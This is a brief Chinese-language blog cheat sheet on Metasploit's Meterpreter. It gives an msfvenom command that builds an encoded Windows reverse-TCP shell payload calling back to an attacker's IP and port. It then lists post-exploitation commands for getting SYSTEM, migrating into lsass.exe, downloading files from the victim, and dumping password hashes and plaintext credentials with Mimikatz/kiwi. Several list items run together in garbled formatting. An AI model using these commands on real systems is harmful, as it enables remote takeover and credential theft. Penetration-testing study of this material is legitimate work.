---
title: Meterpreter 基礎
date: 2021-12-26T23:27:00+08:00
draft: false
url: "/2021/12/26/meterpreter-基礎/"
categories:
  - 資訊安全
  - Windows
showToc: true
TocOpen: false
---

## 產 Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -e x86/shikata_ga_nai > {FILE}
```

## 執行

- 記得 Payload 需要修改成相對應的`windows/meterpreter/reverse_tcp`
- ![](/uploads/2022/02/2ff5a-FJlpYFJ.png)

## 常見指令

- `ls`,`pwd` , `mkdir`, `cat`BJ4`getuid`- ![](/uploads/2022/02/979ce-R2Sovvj.png)
- 取得使用者名稱`edit {檔名}`- 會直接開啟 vim 可以改檔案`sysinfo`- 系統資訊`getsystem`- 如果有過 UAC 的話，有機率可以直接拿 system
- 執行後輸入 `getuid` 就可以確認自己是否真的是 system 了`ps``migrate {PID}`- 可以讓自己爬到 x64 之類的 system 權限上
- 例如 lsass.exe 的 PID`screenshot`- 截圖
- 需要是當前使用者，不能是 system 之類`upload {檔案}` / `download {檔案}`- upload -> attacker to victim
- download -> victim to attacker

## Mimikatz

- 需要是 system 權限
- `load kiwi`
- `help kiwi`
- `lsa_dump_sam`取 Hash`lsa_dump_secrets`- 取明文密碼`kiwi_cmd sekurlsa::logonpasswords`- 需要先 migrate 到 x64 上
